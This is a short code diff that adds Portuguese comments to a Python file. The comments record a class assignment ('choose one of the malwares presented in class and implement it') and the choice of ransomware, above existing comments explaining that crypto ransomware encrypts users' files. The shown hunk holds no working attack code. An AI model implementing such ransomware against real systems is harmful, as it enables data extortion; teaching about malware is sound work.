@@ -5,6 +5,9 @@ import base64
 from tkinter import *
 from tkinter import messagebox
 
+# 1 - Escolha um dos malwares apresentados em sala de aula e o implemente.
+# ESCOLHI RANSOMWARE...
+
 # The aim of crypto ransomware is to encrypt your important data, such as documents,
 # pictures and videos, but not to interfere with basic computer functions.
 # This spreads panic because users can SEE their files but cannot ACCESS them.
